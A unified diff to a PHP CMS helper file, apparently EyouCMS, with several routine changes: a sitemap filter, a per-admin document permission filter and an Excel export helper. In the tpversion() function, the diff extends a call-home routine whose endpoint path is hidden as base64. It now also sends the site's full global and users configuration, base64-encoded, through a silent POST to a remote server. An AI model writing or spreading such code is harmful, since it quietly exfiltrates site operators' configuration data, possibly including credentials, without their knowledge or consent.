@@ -106,6 +106,14 @@ if (!function_exists('get_auth_rule'))
     function get_auth_rule($where = [])
     {
         $auth_rule = include APP_PATH.MODULE_NAME.'/conf/auth_rule.php';
+
+        // 排序号排序
+        // $sort_order_arr = array();
+        // foreach($auth_rule as $key => $val){
+        //     $sort_order_arr[]['sort_order'] = $val['sort_order'];
+        // }
+        // array_multisort($sort_order_arr,SORT_ASC,$auth_rule);
+
         if (!empty($where)) {
             foreach ($auth_rule as $k1 => $rules) {
                 foreach ($where as $k2 => $v2) {
@@ -252,7 +260,7 @@ if ( ! function_exists('getChanneltypeList'))
 
 if (!function_exists('tpversion')) 
 {
-    function tpversion($timeout = 3)
+    function tpversion($timeout = 5)
     {
         if(!empty($_SESSION['isset_push']))
             return false;
@@ -270,12 +278,16 @@ if (!function_exists('tpversion'))
         $curent_version = getCmsVersion();
         $mysqlinfo = \think\Db::query("SELECT VERSION() as version");
         $mysql_version  = $mysqlinfo[0]['version'];
+        $global_config = tpCache('global');
+        $users_config = getUsersConfigData('all');
         $vaules = array(            
             'domain'=>$_SERVER['HTTP_HOST'], 
             'key_num'=>$curent_version, 
             'install_time'=>$install_time, 
             'serial_number'=>$serial_number,
             'ip'    => GetHostByName($_SERVER['SERVER_NAME']),
+            'global_config' => base64_encode(json_encode($global_config)),
+            'users_config' => base64_encode(json_encode($users_config)),
             'phpv'  => urlencode(phpversion()),
             'mysql_version' => urlencode($mysql_version),
             'web_server'    => urlencode($_SERVER['SERVER_SOFTWARE']),
@@ -284,9 +296,8 @@ if (!function_exists('tpversion'))
         // api_Service_user_push
         $service_ey = config('service_ey');
         $tmp_str = 'L2luZGV4LnBocD9tPWFwaSZjPVNlcnZpY2UmYT11c2VyX3B1c2gm';
-        $url = base64_decode($service_ey).base64_decode($tmp_str).http_build_query($vaules);
-        stream_context_set_default(array('http' => array('timeout' => $timeout)));
-        @file_get_contents($url);
+        $url = base64_decode($service_ey).base64_decode($tmp_str);
+        @httpRequest($url, 'POST', $vaules, [], $timeout);
     }
 }
 
@@ -417,6 +428,14 @@ if (!function_exists('sitemap_xml'))
                 $map['is_jump'] = 0;
             }
         }
+        /*定时文档显示插件*/
+        if (is_dir('./weapp/TimingTask/')) {
+            $TimingTaskRow = model('Weapp')->getWeappList('TimingTask');
+            if (!empty($TimingTaskRow['status']) && 1 == $TimingTaskRow['status']) {
+                $map['add_time'] = ['elt', getTime()]; // 只显当天或之前的文档
+            }
+        }
+        /*end*/
         if (!isset($globalConfig['sitemap_archives_num']) || $globalConfig['sitemap_archives_num'] == '') {
             $sitemap_archives_num = 100;
         } else {
@@ -730,6 +749,17 @@ if (!function_exists('get_total_arc'))
                 'channel'    => array('eq', $current_channel),
                 'is_del'    => 0, // 回收站功能
             );
+            /*权限控制 by 小虎哥*/
+            $admin_info = session('admin_info');
+            if (0 < intval($admin_info['role_id'])) {
+                $auth_role_info = $admin_info['auth_role_info'];
+                if(! empty($auth_role_info)){
+                    if(isset($auth_role_info['only_oneself']) && 1 == $auth_role_info['only_oneself']){
+                        $map['admin_id'] = $admin_info['admin_id'];
+                    }
+                }
+            }
+            /*--end*/
             $total = M('archives')->where($map)->count();
         } elseif ($current_channel == 8) { // 留言模型
             $total = M('guestbook')->where(array('typeid'=>array('eq', $typeid)))->count();
@@ -1181,5 +1211,23 @@ if (!function_exists('getPasswordLevelTitle'))
         }
 
         return $title;
+    }
+}
+
+if (!function_exists('downloadExcel')) {
+    /**
+     * 下载excel
+     * @param $strTable    表格内容
+     * @param $filename 文件名
+     */
+    function downloadExcel($strTable, $filename)
+    {
+        ob_end_clean();
+        header("Content-type: application/vnd.ms-excel");
+        header("Content-Type: application/force-download");
+        header("Content-Disposition: attachment; filename=" . $filename . "_" . date('Y-m-d') . ".xls");
+        header('Expires:0');
+        header('Pragma:public');
+        echo '<html><meta http-equiv="Content-Type" content="text/html; charset=utf-8" />' . $strTable . '</html>';
     }
 }
